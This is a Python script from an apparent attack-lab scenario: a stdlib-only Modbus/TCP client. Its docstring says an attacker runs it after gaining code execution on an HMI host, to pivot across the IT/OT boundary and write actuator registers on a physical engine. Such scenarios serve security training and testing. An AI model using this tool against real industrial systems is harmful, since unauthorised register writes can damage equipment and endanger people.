#!/usr/bin/env python3
"""ot_write.py — a minimal, dependency-free Modbus/TCP write-single-register
client. Copied onto the HMI host (see the scenario's guest_files.py); after
the attacker gets RCE on the HMI host (via vuln_app.py), the injected command
runs this to pivot across the IT/OT boundary and write an actuator register on
the physical engine. Pure stdlib (no pymodbus) so it runs with nothing extra
installed on the compromised host.

Usage: ot_write.py <engine_ip> <port> <register>=<raw_value> [<register>=<raw_value> ...]
       ot_write.py <engine_ip> <port> <register> <raw_value> [unit_id]   (legacy form)
`raw_value` is the already-scaled 16-bit register word (see ot_registers.encode).
Several writes go out back to back over ONE TCP connection, in order.
"""

import socket
import struct
import sys

import ot_registers as reg


def _adu(register, raw_value, unit, txn):
    pdu = struct.pack("!BHH", reg.FC_WRITE_SINGLE_REGISTER, register, raw_value & 0xFFFF)
    return struct.pack("!HHHB", txn, 0, len(pdu) + 1, unit) + pdu


def write_registers(engine_ip, port, writes, unit=reg.UNIT_ID, timeout=5.0):
    """Issue fc 0x06 writes [(register, raw_value), ...] in order over one
    connection. Returns the list of raw response bytes."""
    resps = []
    s = socket.create_connection((engine_ip, port), timeout=timeout)
    try:
        for txn, (register, raw_value) in enumerate(writes, start=1):
            s.sendall(_adu(register, raw_value, unit, txn))
            resps.append(s.recv(256))
    finally:
        s.close()
    return resps


def write_single_register(engine_ip, port, register, raw_value, unit=reg.UNIT_ID,
                          txn=1, timeout=5.0):
    return write_registers(engine_ip, port, [(register, raw_value)], unit=unit,
                           timeout=timeout)[0]


def parse_args(argv):
    """-> (engine_ip, port, [(register, raw)], unit)."""
    if len(argv) < 4:
        raise ValueError("usage")
    engine_ip, port, rest = argv[1], int(argv[2]), argv[3:]
    if "=" in rest[0]:
        writes = [tuple(int(x) for x in a.split("=", 1)) for a in rest]
        return engine_ip, port, writes, reg.UNIT_ID
    if len(rest) < 2:
        raise ValueError("usage")
    unit = int(rest[2]) if len(rest) > 2 else reg.UNIT_ID
    return engine_ip, port, [(int(rest[0]), int(rest[1]))], unit


def main(argv):
    try:
        engine_ip, port, writes, unit = parse_args(argv)
    except ValueError:
        print("usage: ot_write.py <engine_ip> <port> <reg>=<raw> [<reg>=<raw> ...]",
              file=sys.stderr)
        return 2
    resps = write_registers(engine_ip, port, writes, unit=unit)
    print("ot_write ok:", " ".join(r.hex() for r in resps))
    return 0


if __name__ == "__main__":
    sys.exit(main(sys.argv))
